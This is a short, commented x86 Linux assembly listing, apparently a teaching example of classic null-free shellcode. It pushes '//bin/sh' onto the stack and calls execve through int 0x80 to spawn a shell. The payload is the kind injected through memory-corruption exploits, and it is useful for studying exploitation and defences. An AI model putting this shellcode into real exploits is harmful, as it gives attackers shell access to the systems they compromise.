section .text
    global _start

_start:
    xor eax, eax    ; We need some nulls to delimit arguments on the stack
    push eax        ; Push the first delimeter: null terminator for the string
    push 0x68732f6e ; Push the string with a program name to launch
    push 0x69622f2f
    mov ebx, esp    ; 1st param: pointer to the string of the program to launch
    push eax        ; Push nulls on the stack to terminate array of string pointers
    push ebx        ; Push pointer to string pointer thus creating array of string pointers (args)
    mov ecx, esp    ; 2nd param: pointer to array of string pointers (args)
    xor edx, edx    ; 3rd param: env vars. Null here works fine.
    mov al, 11      ; execve syscall
    int 80h
